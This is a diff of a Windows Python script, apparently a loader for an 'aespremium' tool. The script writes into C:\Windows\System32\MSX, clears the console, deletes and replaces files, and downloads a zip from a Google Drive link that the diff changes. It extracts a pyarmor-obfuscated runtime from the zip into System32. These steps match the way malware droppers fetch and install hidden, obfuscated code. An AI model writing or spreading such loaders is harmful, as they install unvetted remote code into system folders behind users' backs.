@@ -75,8 +75,6 @@ delete_system32_filex()
 os.system('cls')
 dcnmwxdr = r'C:\Windows\System32\MSX'
 
-if os.path.exists(r"C:\Windows\System32\MSX\aesv1.bat"):
-    os.remove(r"C:\Windows\System32\MSX\aesv1.bat")
 if not os.path.exists(dcnmwxdr):
     os.makedirs(dcnmwxdr)
     os.system('cls')
@@ -163,10 +161,10 @@ os.system('cls')
 print("")
 print("")
 def delete_files_if_aesv3_missing():
-    aesv3_path = r"C:\Windows\System32\MSX\aespremium_nogui.py"
+    aesv3_path = r"C:\Windows\System32\MSX\aesprnoguiv2.py"
     files_to_delete = [
-        r"C:\Windows\System32\MSX\aespremiumv3.py",
-        r"C:\Windows\System32\MSX\aes3.0v1.bat",
+        r"C:\Windows\System32\MSX\aespremium_nogui.py",
+        r"C:\Windows\System32\MSX\aespremium_nogui.bat",
         r"C:\Windows\System32\MSX\pyarmor_runtime_000000"
     ]
 
@@ -198,8 +196,8 @@ def download_file_from_google_drive(url, output_path):
 
 if not os.path.exists("C:\\Windows\\System32\\MSX\\pyarmor_runtime_000000"):
     print("downloading required libraries, please wait a moment...")
-    download_file_from_google_drive("https://drive.google.com/uc?id=1msnd9-C6xCqXe3ZfS9NkhqyR4OIRTS3F", "C:\\Windows\\System32\\MSX\\noguixx.zip")
-    zip_file = r'C:\Windows\System32\MSX\noguixx.zip'
+    download_file_from_google_drive("https://drive.google.com/uc?id=1tw6OcWV_awfrzrpYCbmd4sBdfqDY2cFU", "C:\\Windows\\System32\\MSX\\nogx.zip")
+    zip_file = r'C:\Windows\System32\MSX\nogx.zip'
     extract_dir = r'C:\Windows\System32\MSX'
     extract_zip(zip_file, extract_dir)
     os.remove(zip_file)
